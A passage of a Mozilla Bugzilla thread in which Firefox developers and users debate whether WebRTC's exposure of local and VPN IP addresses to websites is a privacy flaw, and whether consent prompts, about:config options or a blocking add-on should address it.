No, it doesn't ask anything before it provides the IP addresses to the content script.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=959893#c36)• 10 years ago |
|  | |

(In reply to Xidorn Quan [:xidorn] (UTC+11) from [comment #35](/show_bug.cgi?id=959893#c35 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #34](/show_bug.cgi?id=959893#c34 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > (In reply to Masatoshi Kimura [:emk] from [comment #33](/show_bug.cgi?id=959893#c33 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > > (In reply to Randell Jesup [:jesup] from [comment #6](/show_bug.cgi?id=959893#c6 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > > > Revealing internal LAN IPs (of almost all devices on your local net) can be
> > > > done without use of WebRTC.
> > >
> > > How can?
> > >
> > > > WebRTC may expose the local LAN address of the
> > > > browser more easily, but often this can be guessed from the scan of other
> > > > LAN addresses.
> > >
> > > Content scripts from random web sites can not scan LAN addresses because of
> > > the same origin policy. WebRTC even subverts the SOP.
> >
> > Hmm.... Please describe the attack you have in mind. Note that content scripts
> > actually can talk to arbitrary local LAN addresses, they just can't read the
> > response.
>
> They can talk to arbitrary local LAN addresses via XHR, but they can only
> collect information via checking the interval between callbacks being
> invoked. AFAICS, the detailed error information is not provided to the
> content script.
Yes, that's correct.
> However, time is a very unreliable information. In LAN, the
> deviation of delay of local response may even be larger than the network
> delay. Hence it is almost, if not completely, infeasible to detect local
> address via things like XHR.
>
> In addition, it is infeasible to detect \*all\* IP addresses of a machine,
> because of the large address space.
>
> > And WebRTC incorporates a consent check before it lets you send
> > application-controlled data somewhere. So, what is it specifically you think
> > that WebRTC lets you do?
>
> No, it doesn't ask anything before it provides the IP addresses to the
> content script.
It provides the machine's local address, but not any addresses of other
machines on the LAN.
Again, I'd encourage you to describe the attack you are concerned about.
Is it merely disclosure of the local IP addresses of the machine, or something
else?

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=959893#c37)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #36](/show_bug.cgi?id=959893#c36 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Again, I'd encourage you to describe the attack you are concerned about.
> Is it merely disclosure of the local IP addresses of the machine, or
> something else?
To me, yes. I'm not sure whether :emk has any other attacks in mind. But I think disclosure of local addresses has been terrible enough.

|  | [jksdua](/user_profile?user_id=495639) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=959893#c38)• 10 years ago |
|  | |

You are right in that the attack lets you discover local IP addresses of the affected user. However, making it trivial to discover local IP addresses makes it much easier to start exploiting weaknesses in the local network from arbitrary websites with malicious intent.
It may also be used as another vector in trying to persistently identify a user's identity bypassing any anonymising controls such as Tor, VPN etc. This is a very serious privacy issue for Firefox users.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=959893#c39)• 10 years ago |
|  | |

As I said in [comment #2](/show_bug.cgi?id=959893#c2 "NEW - [meta] WebRTC Internal IP Address Leakage"), Firefox is conformant to the RTCWEB specification,
so you should raise this issue on the IETF RTCWEB mailing list:
<https://www.ietf.org/mailman/listinfo/rtcweb>'
I (and others) do appreciate that this has negative impacts if you are
trying to hide your IP address and if you have a proposal for how Firefox
can determine that people want that and suppress WebRTC, that's something
we could look at.

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=959893#c40)• 10 years ago |
|  | |

I propose that we have an individual permission bit for sites to control whether one is allowed to use webrtc, just like what we do for things in about:permissions.
I guess we can do this when the content script invokes createOffer, which can be responsed async. Does it sound like a feasible solution?

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=959893#c41)• 10 years ago |
|  | |

I don't really understand what you're proposing. I would not be in favor of changing Firefox to by default prompt users before sites are allowed to use WebRTC.

|  | [[:fabrice] Fabrice Desré](/user_profile?user_id=390071) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=959893#c42)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #41](/show_bug.cgi?id=959893#c41 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> I don't really understand what you're proposing. I would not be in favor of
> changing Firefox to by default prompt users before sites are allowed to use
> WebRTC.
We do it for gUM(). Why not for the other apis?

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=959893#c43)• 10 years ago |
|  | |

Yes, I propose that we prompt users before sites are allowed to use WebRTC. If they also uses media capture, then we may grant WebRTC permission as soon as user allow the site to use microphone or camera, so that we don't add one more prompt to annoy users. But if a site uses data channel only, I think it is reasonble to promot user for permission before we leak any privacy info to the site.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=959893#c44)• 10 years ago |
|  | |

(In reply to Fabrice Desré [:fabrice] from [comment #42](/show_bug.cgi?id=959893#c42 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #41](/show_bug.cgi?id=959893#c41 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > I don't really understand what you're proposing. I would not be in favor of
> > changing Firefox to by default prompt users before sites are allowed to use
> > WebRTC.
>
> We do it for gUM(). Why not for the other apis?
Because the other APIs hae significantly different privacy implications
as explained in detail in the RTCWEB Specification

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=959893#c45)• 10 years ago |
|  | |

(In reply to Xidorn Quan [:xidorn] (UTC+11) from [comment #43](/show_bug.cgi?id=959893#c43 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Yes, I propose that we prompt users before sites are allowed to use WebRTC.
> If they also uses media capture, then we may grant WebRTC permission as soon
> as user allow the site to use microphone or camera, so that we don't add one
> more prompt to annoy users. But if a site uses data channel only, I think it
> is reasonble to promot user for permission before we leak any privacy info
> to the site.
Yes, this was extensively discussed and the decision was made not
to prompt in this case. I realize that some people are not happy
about that, but I haven't seen any points made here that were not
made the last time we discussed it.
Jesup, I propose we close this with WONTFIX.Flags: needinfo?(rjesup)

|  | [[:fabrice] Fabrice Desré](/user_profile?user_id=390071) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=959893#c46)• 10 years ago |
|  | |

Can you give pointers to these previous discussions?

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=959893#c47)• 10 years ago |
|  | |

(In reply to jksdua from [comment #38](/show_bug.cgi?id=959893#c38 "NEW - [meta] WebRTC Internal IP Address Leakage"))
>
> It may also be used as another vector in trying to persistently identify a
> user's identity bypassing any anonymising controls such as Tor, VPN etc.
> This is a very serious privacy issue for Firefox users.
And corporate VPNs that deal with trade secrets.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=959893#c48)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #47](/show_bug.cgi?id=959893#c47 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to jksdua from [comment #38](/show_bug.cgi?id=959893#c38 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> >
> > It may also be used as another vector in trying to persistently identify a
> > user's identity bypassing any anonymising controls such as Tor, VPN etc.
> > This is a very serious privacy issue for Firefox users.
>
> And corporate VPNs that deal with trade secrets.
And VirtualBox. And CableCARD. And corporate Intranets that deal with trade secrets.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=959893#c49)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #48](/show_bug.cgi?id=959893#c48 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Dan Q (RedBlade7) from [comment #47](/show_bug.cgi?id=959893#c47 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > (In reply to jksdua from [comment #38](/show_bug.cgi?id=959893#c38 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > >
> > > It may also be used as another vector in trying to persistently identify a
> > > user's identity bypassing any anonymising controls such as Tor, VPN etc.
> > > This is a very serious privacy issue for Firefox users.
> >
> > And corporate VPNs that deal with trade secrets.
>
> And VirtualBox. And CableCARD. And corporate Intranets that deal with trade
> secrets.
Do you think there could be serious legal consequences if one was to use Firefox in a corporate setting?

|  | [Masatoshi Kimura [:emk]](/user_profile?user_id=5842) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a33389613_5842)• 10 years ago |

No longer blocks: [1128236](/show_bug.cgi?id=1128236 "RESOLVED DUPLICATE - When on some VPN software Implementations, STUN candidates will still include your real IP address")

|  | [Daniel Roesler](/user_profile?user_id=305342) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=959893#c51)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #39](/show_bug.cgi?id=959893#c39 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> As I said in [comment #2](/show_bug.cgi?id=959893#c2 "NEW - [meta] WebRTC Internal IP Address Leakage"), Firefox is conformant to the RTCWEB specification
I've done a lot of reading, and it seems that there's some wiggle room in the specifications.
First, when calling createOffer() to generate the SDP, it says, "To Do: Discuss privacy aspects of this from a fingerprinting point of view - it's probably around as bad as access to a canvas :-)"[1]. This seems exactly what we are discussing here!
Additionally, the SDP blob that is being generated is specified in RFC 3264[2], who's abstract states, "This document defines a mechanism by which two entities can make use of the Session Description Protocol (SDP) to arrive at a common view of a multimedia session between them." I interpret this as assuming that the two "entities" have given consent to the communication.
So, from the SDP spec and the WebRTC note, it would be very easy to conclude that in order to generate the SDP blob, you need user consent. Therefore, if Firefox has not already obtained user consent via the getUserMedia() requirement[3], calling createOffer() MUST include a prompt asking the user for consent to create the offer.
Second, even if a stun server is unreachable, IP addresses other than your local IP address will still sometimes appear as ICE candidates because of the computer's network setup[4]. On Windows using many common VPN setups, this results in the both the public IP and VPN internal IP being made available as ICE candidates, even without the STUN request.
From as far as I can tell, this is because in the ICE spec, it says, "If an agent is multihomed, it obtains a candidate from each IP address."[5] However, I'm confused on how the browsers knows if the computer is multihomed. When sending a normal HTTP request to <https://www.mozilla.org/> which network interface is used? Does the browser get to choose network interfaces or is it given one by the operating system?
The browser must know which network interface is being used for its other internet connections, even if it knows all the network interfaces available (which is still weird to me). Given that, and the fact that the ICE specification for multihoming is optional, Firefox should consider itself never multihomed and only the local IP address that is used for internet connectivity (i.e. what it is using to make the STUN request) and the STUN request result be made avaiable as an ICE candidate.
So to recap, here's what I propose:
1. If not already obtained via getUserMedia(), get user consent when createOffer() is called.
2. Only offer the local IP address that is used to make the STUN request as a local ICE candidate.
[1]: <https://w3c.github.io/webrtc-pc/#widl-RTCPeerConnection-createOffer-Promise-RTCSessionDescription--RTCOfferOptions-options>
[2]: <http://tools.ietf.org/html/rfc3264>
[3]: <http://www.w3.org/TR/mediacapture-streams/#dom-navigator-getusermedia>
[4]: [https://bugzilla.mozilla.org/show\_bug.cgi?id=1128236#c7](/show_bug.cgi?id=1128236#c7 "RESOLVED DUPLICATE - When on some VPN software Implementations, STUN candidates will still include your real IP address")
[5]: <https://tools.ietf.org/html/rfc5245#section-2.1>

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=959893#c52)• 10 years ago |
|  | |

(In reply to Daniel Roesler from [comment #51](/show_bug.cgi?id=959893#c51 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #39](/show_bug.cgi?id=959893#c39 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > As I said in [comment #2](/show_bug.cgi?id=959893#c2 "NEW - [meta] WebRTC Internal IP Address Leakage"), Firefox is conformant to the RTCWEB specification
>
> I've done a lot of reading, and it seems that there's some wiggle room in
> the specifications.
>
> First, when calling createOffer() to generate the SDP, it says, "To Do:
> Discuss privacy aspects of this from a fingerprinting point of view - it's
> probably around as bad as access to a canvas :-)"[1]. This seems exactly
> what we are discussing here!
This note is primarily about codec capabilities, etc. not IP addresses.
The IETF WG discussed the behavior around IP addresses and had consensus
that merely setting up the communications channel using ICE should not
require consent. Again, I encourage you to raise this on the WG lists.

|  | [Sergey](/user_profile?user_id=368337) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=959893#c53)• 10 years ago |
|  | |

Is there an addon allowing to filter out e.g. 192.168.0.0/16 and 10.0.0.0/8 addresses? Such addon with configurable masks list should probably satisfy most of the people complaining about this issue.

|  | [Daniel Roesler](/user_profile?user_id=305342) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=959893#c54)• 10 years ago |
|  | |

(In reply to Sergey from [comment #53](/show_bug.cgi?id=959893#c53 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Is there an addon allowing to filter out e.g. 192.168.0.0/16 and 10.0.0.0/8
> addresses? Such addon with configurable masks list should probably satisfy
> most of the people complaining about this issue.
That's not the biggest issue. The biggest issue is that WebRTC exposes your real IP for VPN users (PPTP or IPSEC/L2TP, dunno about OpenVPN). See #1128236, which for some reason is marked as a duplicate of this bug.
Why that doesn't qualify as a big security issue, I don't know.

|  | [Sergey](/user_profile?user_id=368337) |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=959893#c55)• 10 years ago |
|  | |

> The biggest issue is that WebRTC exposes your real IP for VPN users
> (PPTP or IPSEC/L2TP, dunno about OpenVPN). See #1128236, which for
> some reason is marked as a duplicate of this bug.
That issue could also be solved by such addon by adding your real ip/mask to the exclusion filter list of that addon.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=959893#c56)• 10 years ago |
|  | |

(In reply to Daniel Roesler from [comment #54](/show_bug.cgi?id=959893#c54 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Sergey from [comment #53](/show_bug.cgi?id=959893#c53 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > Is there an addon allowing to filter out e.g. 192.168.0.0/16 and 10.0.0.0/8
> > addresses? Such addon with configurable masks list should probably satisfy
> > most of the people complaining about this issue.
>
> That's not the biggest issue. The biggest issue is that WebRTC exposes your
> real IP for VPN users (PPTP or IPSEC/L2TP, dunno about OpenVPN). See
> #1128236, which for some reason is marked as a duplicate of this bug.
>
> Why that doesn't qualify as a big security issue, I don't know.
Yes it does affect OpenVPN too.
The biggest issue here is the leak of confidential corporate information, whether it a remote VPN or just their in-office Intranet. You shouldn't need a browser addon to prevent that, especially since it would require the IT department to place the company's office Intranet in the hands of random addon developers.

|  | [Sergey](/user_profile?user_id=368337) |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=959893#c57)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #56](/show_bug.cgi?id=959893#c56 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> You shouldn't need a browser addon to prevent that, especially since
> it would require the IT department to place the company's office
> Intranet in the hands of random addon developers.
Sure it would be nice to have such feature in firefox. But having it as addon is still better than nothing. IT department could at least drop a preconfigured addon if such addon exists.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=959893#c58)• 10 years ago |
|  | |

Attached file
[statutory add-on to notify users of (new mozPeerConnection)](attachment.cgi?id=8570681)
— [Details](attachment.cgi?id=8570681&action=edit)

I created an add-on to help relieve some of the pressure with the mixed feelings, it's submitted to AMO for Review as of 5 minutes ago: <https://addons.mozilla.org/en-US/firefox/addon/statutory/>
I also created a light weight version only 11kb which i attached until an official solution can be found.
Once again this is unofficial it can be verified.
This overwrites the RTC constructors with my own functions then displays notification popups for the user to click to enable access. I set a preference to disable notifications in the event the user would only like to prevent WebRTC all together.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=959893#c59)• 10 years ago |
| typo | |

| Comment hidden (typo) |  |
| --- | --- |

Attached file
[statutory add-on to notify users of (new mozPeerConnection), take 2](attachment.cgi?id=8570682) (obsolete)
— [Details](attachment.cgi?id=8570682&action=edit)

Selected the right file type this time.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 60](/show_bug.cgi?id=959893#c60)• 10 years ago |
| typo | |

| Comment hidden (typo) |  |
| --- | --- |

Comment on [attachment 8570681](/attachment.cgi?id=8570681 "statutory add-on to notify users of (new mozPeerConnection)") [[details]](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)")
statutory add-on to notify users of (new mozPeerConnection)
Nothing to see here, move along, move along.
[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment description: statutory add-on to notify users of (new mozPeerConnection) → Blank
[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment filename: statutory.xpi → Blank

|  | [[:Aleksej]](/user_profile?user_id=197295) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a35327701_197295)• 10 years ago |

[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment description: Blank → statutory add-on to notify users of (new mozPeerConnection)
[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment is obsolete: true

|  | [[:Aleksej]](/user_profile?user_id=197295) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a35327735_197295)• 10 years ago |

[Attachment #8570682](/attachment.cgi?id=8570682&action=edit "statutory add-on to notify users of (new mozPeerConnection), take 2") -
Attachment description: statutory add-on take 2 → statutory add-on to notify users of (new mozPeerConnection), take 2

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 61](/show_bug.cgi?id=959893#c61)• 10 years ago |
|  | |

(In reply to Sergey from [comment #57](/show_bug.cgi?id=959893#c57 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Dan Q (RedBlade7) from [comment #56](/show_bug.cgi?id=959893#c56 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > You shouldn't need a browser addon to prevent that, especially since
> > it would require the IT department to place the company's office
> > Intranet in the hands of random addon developers.
>
> Sure it would be nice to have such feature in firefox. But having it as
> addon is still better than nothing. IT department could at least drop a
> preconfigured addon if such addon exists.
Here is a good example of what I'm talking about.
1. Say for instance you knew RedBlade7 came from Bladetown, and that RedBlade7 had a CableCARD tuner.
2. You look up Bladetown and find out Bladetown Cablecorp is the only cable TV provider.
3. A malicious user takes advantage of the WebRTC leakage, and can find out RedBlade7's tuner's IP, subnet, etc.
4. Bladetown Cablecorp's network configuration is now public knowledge.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 62](/show_bug.cgi?id=959893#c62)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #61](/show_bug.cgi?id=959893#c61 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Sergey from [comment #57](/show_bug.cgi?id=959893#c57 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > (In reply to Dan Q (RedBlade7) from [comment #56](/show_bug.cgi?id=959893#c56 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > > You shouldn't need a browser addon to prevent that, especially since
> > > it would require the IT department to place the company's office
> > > Intranet in the hands of random addon developers.
> >
> > Sure it would be nice to have such feature in firefox. But having it as
> > addon is still better than nothing. IT department could at least drop a
> > preconfigured addon if such addon exists.
>
> Here is a good example of what I'm talking about.
>
> 1. Say for instance you knew RedBlade7 came from Bladetown, and that
> RedBlade7 had a CableCARD tuner.
> 2. You look up Bladetown and find out Bladetown Cablecorp is the only cable
> TV provider.
> 3. A malicious user takes advantage of the WebRTC leakage, and can find out
> RedBlade7's tuner's IP, subnet, etc.
> 4. Bladetown Cablecorp's network configuration is now public knowledge.
edit: subnet->DNS server (and the device does have its own DNS server)

|  | [[:Aleksej]](/user_profile?user_id=197295) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a35376061_197295)• 10 years ago |

[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment filename: Blank → statutory.xpi
[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment is obsolete: false
[Attachment #8570681](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)") -
Attachment mime type: application/vnd.mozilla.xul+xml → application/x-xpinstall

|  | [[:Aleksej]](/user_profile?user_id=197295) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a35376073_197295)• 10 years ago |

[Attachment #8570682](/attachment.cgi?id=8570682&action=edit "statutory add-on to notify users of (new mozPeerConnection), take 2") -
Attachment is obsolete: true

|  | [brock](/user_profile?user_id=517416) |  |
| --- | --- | --- |
| [Comment 63](/show_bug.cgi?id=959893#c63)• 10 years ago |
|  | |

(In reply to Jared Null from [comment #58](/show_bug.cgi?id=959893#c58 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Created [attachment 8570681](/attachment.cgi?id=8570681 "statutory add-on to notify users of (new mozPeerConnection)") [[details]](/attachment.cgi?id=8570681&action=edit "statutory add-on to notify users of (new mozPeerConnection)")
> statutory add-on to notify users of (new mozPeerConnection)
>
> I created an add-on to help relieve some of the pressure with the mixed
> feelings, it's submitted to AMO for Review as of 5 minutes ago:
> <https://addons.mozilla.org/en-US/firefox/addon/statutory/>
>
> I also created a light weight version only 11kb which i attached until an
> official solution can be found.
>
> Once again this is unofficial it can be verified.
>
> This overwrites the RTC constructors with my own functions then displays
> notification popups for the user to click to enable access. I set a
> preference to disable notifications in the event the user would only like to
> prevent WebRTC all together.
Your add-on does not install on Firefox Android. Can you make it available there as well?
Stopped the leak on Firefox on Windows. Should be the default condition.
Chrome does the same? OF COURSE it does. collecting info like that is how google makes their money.
You can do better! Remember, you work for the Users, not the Standard committee or the Web infotainment industry. Fix this ASAP, then issue a press release on how Chrome is revealing private info without permission. (My internal LAN configuration IS private - no one's business but mine!!)
VPN's are not the problem. Most access is through a NAT router. The combination of public ISP address and LAN address allows the identification of a particular device, and once you ever log in to some site, a particular user. Instead of one of 100 devices at XYZ corp, you are using a Particular device. Once you log in to a site that traffics in such info, you are tied to that device on any web site you visit which also traffics in such info, without a login. This bug makes device fingerprinting trivial.
As to VPN's: When I access the VPN at the University of Michigan, net.ipcalf.com sees my lan address and a U-M address. It does not see my ISP address. So, if my lan address is in the usual recommended ranges, there could be MANY devices with that address, and the next time I log in to the VPN, that address will change as well. In my case however, I do not use the usual address ranges, I use addresses assigned to an internal Sun Microsystems network which Sun, back in the day, suggested people use for their internal networks, so my lan address is probably much closer to unique.
And, "Complies with the Standard" is a lame excuse for \*\*\*\* software.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 64](/show_bug.cgi?id=959893#c64)• 10 years ago |
|  | |

> Stopped the leak on Firefox on Windows. Should be the default condition.
> Chrome does the same? OF COURSE it does. collecting info like that is how
> google makes their money.
While Google does make their money from user info, they don't need this to do it. An addon like this is a reasonable option for those who want to control access to these features.
> You can do better! Remember, you work for the Users, not the Standard
> committee or the Web infotainment industry. Fix this ASAP, then issue a
> press release on how Chrome is revealing private info without permission.
> (My internal LAN configuration IS private - no one's business but mine!!)
Fixing this the way you suggest would seriously hurt most users of the API. There are plenty of security/privacy advocates/paranoids in the IETF, and the spec is the result of such discussions.
> VPN's are not the problem. Most access is through a NAT router. The
> combination of public ISP address and LAN address allows the identification
> of a particular device, and once you ever log in to some site, a particular
> user. Instead of one of 100 devices at XYZ corp, you are using a
> Particular device. Once you log in to a site that traffics in such info,
> you are tied to that device on any web site you visit which also traffics in
> such info, without a login. This bug makes device fingerprinting trivial.
Device fingerprinting is (unfortunately) far more trivial than you realize, without this. Your addons and fontlist alone (unless you run a set of virtually-untouched clones) does wonders for fingerprinting. Panopticlick tells me that my plugin list alone makes me unique. Once you're unique, (or even anywhere close to), adding more bits has very small impact. There was much discussion of this...
> As to VPN's: When I access the VPN at the University of Michigan,
> net.ipcalf.com sees my lan address and a U-M address. It does not see my
> ISP address. So, if my lan address is in the usual recommended ranges, there
> could be MANY devices with that address, and the next time I log in to the
> VPN, that address will change as well. In my case however, I do not use the
> usual address ranges, I use addresses assigned to an internal Sun
> Microsystems network which Sun, back in the day, suggested people use for
> their internal networks, so my lan address is probably much closer to
> unique.
Ok... not something normal users do (not something almost any other user does). LAN addresses can be indirectly probed without webrtc, in fact a site can fingerprint you simply by the set of LAN addresses in use. (a: assume one of the "standard" LAN subnet ranges and probe to find which one (typically looking at X.X.X.1), b: probe each address in the subnet to see how fast an <img> request times out there. Result: LAN network map. Doesn't work for all users, but works for probably 99% of home users, which is total success from a tracker's point of view. This might even work on you without WebRTC.) And there are other ways. I wonder if tor hard-blocks all LAN-like addresses from network requests... hope so
If you're serious about using a VPN to hide your local network - run it in the router and/or disable all non-VPN routes. That makes this largely irrelevant. Software VPNs that don't disable non-VPN routes are not anonymity-preserving. Sorry; I realize most people think they are (and for some uses, they're good enough)
A patch to add blocking all non-relay candidates as an option/about:config is something we'd likely accept. Note is does \*not\* stop determined attackers from finding these, but it makes it harder, and blocks casual or end-user attempts to locate you.
> And, "Complies with the Standard" is a lame excuse for \*\*\*\* software.
Yes - but if so, go to the standards committee. These aren't being handed down from on-high. Propose a workable solution that balances user privacy with user utility, and people will listen. I guarantee forcing/encouraging people to use Skype instead of WebRTC greatly increases the ability of certain people to intercept it (and don't forget Skype and things like it are desktop installs - typically they can do \*anything\* to your system, adn they're totally closed-source.)
My apologies, but I probably won't reply again here as I'm way too busy already, and I realize discussions like this can go on forever - and bugzilla isn't a forum.Flags: needinfo?(rjesup)

|  | [Pascal Ernster](/user_profile?user_id=440713) |  |
| --- | --- | --- |
| [Comment 65](/show_bug.cgi?id=959893#c65)• 10 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #64](/show_bug.cgi?id=959893#c64 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Fixing this the way you suggest would seriously hurt most users of the API.
> There are plenty of security/privacy advocates/paranoids in the IETF, and
> the spec is the result of such discussions.
This is obviously untrue, otherwiese the spec for WebRTC was not as broken as it is.
> Device fingerprinting is (unfortunately) far more trivial than you realize,
If you really consider this "unfortunate", then do something about it and help us fix it instead of trying to find lame excuses to defend broken standards.
> without this. Your addons and fontlist alone (unless you run a set of
> virtually-untouched clones) does wonders for fingerprinting. Panopticlick
> tells me that my plugin list alone makes me unique. Once you're unique, (or
> even anywhere close to), adding more bits has very small impact. There was
> much discussion of this...
Correct. However, the only thing this shows is that JavaScript is a broken standard, too - and one broken standard is not a valid excuse for releasing or implementing more broken standards.
There is no legitimate reason whatsoever why JavaScript code loaded from a random Website should be able to enumerate the fonts or the addons installed in the browser. Webfonts have been standardized and broadly supported in all relevant browser for years, as is HTTP caching. There is no reason to allow a website enumerate my locally installed fonts.
As far as addons are concerned: It is neither necessary nor legitimate for a website to be able to fingerprint the extensions installed in my browser. And as for plugins (like Flash or Java), there are ecactly TWO legitimate ways for a website to interact with plugins installed in the browser: By using the <object> tag or the <embed> tag with the correct mime type set. Any other way should be considered a bug and be eradicated from the face of the earth for the good of humanity.
> Ok... not something normal users do (not something almost any other user
> does). LAN addresses can be indirectly probed without webrtc, in fact a
> site can fingerprint you simply by the set of LAN addresses in use. (a:
> assume one of the "standard" LAN subnet ranges and probe to find which one
> (typically looking at X.X.X.1), b: probe each address in the subnet to see
> how fast an <img> request times out there. Result: LAN network map.
> Doesn't work for all users, but works for probably 99% of home users, which
> is total success from a tracker's point of view. This might even work on
> you without WebRTC.) And there are other ways. I wonder if tor hard-blocks
> all LAN-like addresses from network requests... hope so
Yes, and this bug has been known for years, too. There is no legitimate reason for 99,999% of websites to include content from RFC1918 IP adresses (or from DNS records that resolve to such IP adresses). For the file:// URL scheme, this bug was fixed a long time ago, and there is no reason not to fix it for RFC1918 IP adresses as well.
It may be legitimate for a website from an RFC1918 IP range (or even for an HTML file on your local hard disk) to include content from the internet, but not the other way around.
> If you're serious about using a VPN to hide your local network - run it in
> the router and/or disable all non-VPN routes. That makes this largely
> irrelevant. Software VPNs that don't disable non-VPN routes are not
> anonymity-preserving. Sorry; I realize most people think they are (and for
> some uses, they're good enough)
The problem are not VPNs, the problem are browsers carelessly implementing any bullcrap that calls itself a standard without questioning the impact on the user's privacy. For christ's sake, we are talking about a \*browser\*. As you are obviously not aware, a browser is a piece of software that is meant to render HTML files, not to reimplement nmap.
> A patch to add blocking all non-relay candidates as an option/about:config
> is something we'd likely accept. Note is does \*not\* stop determined
> attackers from finding these, but it makes it harder, and blocks casual or
> end-user attempts to locate you.
about:config is not a solution, it is a dirty hack for substituting missing UI components until they are properly implemented. And even if there was such an about:config option or even a proper UI element to configure this setting, this still wouldn't fix the problem that you are shipping with insanely broken default settings that no normal user could expect.
> > And, "Complies with the Standard" is a lame excuse for \*\*\*\* software.
>
